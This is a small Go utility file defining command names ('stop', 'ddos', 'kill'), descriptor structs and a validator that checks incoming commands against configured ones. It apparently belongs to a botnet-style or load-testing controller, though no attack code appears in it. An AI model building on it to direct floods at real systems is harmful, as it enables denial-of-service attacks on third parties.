package utils

const LT_COMMAND_STOP = "stop"
const LT_COMMAND_DDOS = "ddos"
const LT_COMMAND_KILL = "kill"

var commandsDict []string
var commandsMap = make(map[string]int)

type ParamType struct {
	Param       string `json:"param"`
	Type        string `json:"type"`
	Description string `json:"description"`
}

type CommandDescriptorType struct {
	Id          int         `json:"id"`
	Name        string      `json:"command"`
	Description string      `json:"description"`
	Params      []ParamType `json:"params"`
}

type CommandType struct {
	Id     int
	Name   string
	Params []interface{}
}

func IsCorrectCommand(cmd CommandType) (isCorrect bool, err error) {
	var commands = GetSettings().Commands

	for _, c := range commands {
		commandsDict = append(commandsDict, c.Name)
		commandsMap[c.Name] = len(c.Params)
	}

	if _, ok := commandsMap[cmd.Name]; ok {
		return true, nil
	}

	return false, LTCommandError{cmd}
}